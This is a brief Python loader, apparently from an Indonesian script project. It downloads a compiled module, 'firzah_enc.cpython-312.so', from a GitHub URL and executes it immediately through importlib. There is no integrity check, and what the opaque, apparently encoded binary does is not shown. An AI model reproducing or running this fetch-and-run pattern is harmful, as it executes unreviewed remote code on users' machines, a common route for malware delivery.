import os
import importlib.util
import urllib.request
file_path = "firzah_enc.cpython-312.so"
download_url = "https://github.com/FIRandZAH/encode/refs/heads/main/firzah_enc.cpython-312.so"
if not os.path.exists(file_path):
    print("sedang download script")
    urllib.request.urlretrieve(download_url, file_path)
if os.path.exists(file_path):
    spec = importlib.util.spec_from_file_location("firzah_enc", file_path)
    fb = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(fb)
    
